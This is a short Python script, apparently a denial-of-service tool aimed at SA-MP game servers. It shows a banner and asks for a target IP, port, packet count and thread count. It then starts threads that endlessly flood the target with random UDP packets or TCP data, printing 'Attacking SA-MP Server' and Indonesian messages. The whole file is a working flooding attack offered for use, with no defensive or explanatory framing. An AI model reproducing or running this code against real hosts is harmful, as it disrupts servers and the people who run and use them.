#!/usr/bin/env python3
import random
import socket
import threading

print("""
_▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█   ▀▀▀▀▀▀▀   ▀  ▀▀▀▀▀▀▀  ▀
█        ▀       ▀        ▀
█       ▀     ▀  ▀▀▀▀▀▀▀  ▀
█     ▀       ▀  ▀        ▀
█   ▀▀▀▀▀▀▀   ▀  ▀▀▀▀▀▀▀  ▀▀▀▀▀
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")

ip = str(input(" IP : "))
port = int(input(" PORT : "))
choice = str(input(" READY MANIEZ? (y/n) : "))
times = int(input(" PACKETS : "))
threads = int(input(" THREADS : "))
def run():
	data = random._urandom(811)
	i = random.choice(("[@]","[$]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Loss. Attacking SA-MP Server")
		except:
			print("[!] AHHH CAPEK AKU MAS")

def run2():
	data = random._urandom(811)
	i = random.choice(("[!]","[@]","[$]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Loss. Attacking SA-MP Server")
		except:
			s.close()
			print("[!] AHHH CAPEK AKU MAS")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
